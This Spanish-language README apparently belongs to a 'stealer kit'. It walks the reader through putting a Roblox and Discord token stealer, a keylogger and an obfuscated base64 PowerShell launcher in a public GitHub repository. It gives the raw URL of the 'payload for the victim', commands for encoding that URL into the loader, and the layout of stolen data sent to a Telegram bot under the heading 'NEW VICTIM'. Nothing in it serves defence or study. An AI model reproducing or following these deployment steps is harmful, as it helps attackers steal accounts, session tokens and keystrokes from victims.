# Stealer Kit - GitHub Deploy

## Archivos en esta carpeta
- telegram_collector.py → CONFIGURADO con tu bot token y chat_id
- stealer.ps1 → Roba tokens Roblox + Discord + info sistema
- keylogger.ps1 → Captura teclas
- payload_final.ps1 → Coordina todo + envía a Telegram
- launcher.ps1 → Loader ofuscado (base64)
- build.ps1 → Genera launcher ofuscado final

## Pasos para subir a GitHub

### 1. Crear repo en GitHub
1. Entrá a https://github.com/new
2. Nombre: `stealer-repo`
3. Tipo: **Público**
4. **NO** marques "Add a README"
5. Click: Create repository

### 2. Subir archivos por terminal
```bash
cd /home/kali/paginaminevoid/media/sf_pasar_datos

# Configurar git
git init
git config user.email "TU_EMAIL_GITHUB"
git config user.name "TU_USERNAME_GITHUB"

git add .
git commit -m "Stealer Kit files"
git remote add origin https://github.com/TU_USERNAME/stealer-repo.git
git branch -M main
git push -u origin main
```

Cuando te pida autenticación, usá un **Personal Access Token**:
1. GitHub → Settings → Developer settings → Personal access tokens → Tokens (classic)
2. Generate new token → Scopes: `repo`
3. Copiá el token y usalo como contraseña en el push

### 3. URLs resultantes
- **Payload para víctima:**
  `https://raw.githubusercontent.com/TU_USERNAME/stealer-repo/main/payload_final.ps1`
- **Telegram lib para payload_final.ps1:**
  `https://raw.githubusercontent.com/TU_USERNAME/stealer-repo/main/telegram_collector.py`

### 4. Configurar launcher ofuscado
En PowerShell, generá el base64 de tu URL de payload:
```powershell
$url = "https://raw.githubusercontent.com/TU_USERNAME/stealer-repo/main/payload_final.ps1"
$enc = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($url))
$enc
```
Pegá ese valor en `launcher.ps1` donde dice `REPLACE_BASE64_URL_1`.

### 5. Prueba
1. Ejecutá `launcher.ps1` en una VM de prueba
2. Revisá tu Telegram Bot `@stealer_monitor_bot` para ver los datos

## Estructura de datos que recibirás en Telegram
```
🔓 NUEVA VÍCTIMA 🔓
━━━
Hora | Usuario | PC | OS | RAM | IP

💬 Discord Tokens: (N tokens)
🎮 Roblox Tokens: (N tokens)
🎮 Roblox Sessions: (N sessions)
⌨️ Keylog: (archivo)
```

## Notas importantes
- El repo puede ser público sin problema
- Tu PC no necesita estar encendida
- Los datos van directo a Telegram
- El payload_final.ps1 referencia archivos locales (stealer.ps1, keylogger.ps1, telegram_collector.py)
- Asegurate que esos archivos estén en la misma carpeta que el payload en el servidor
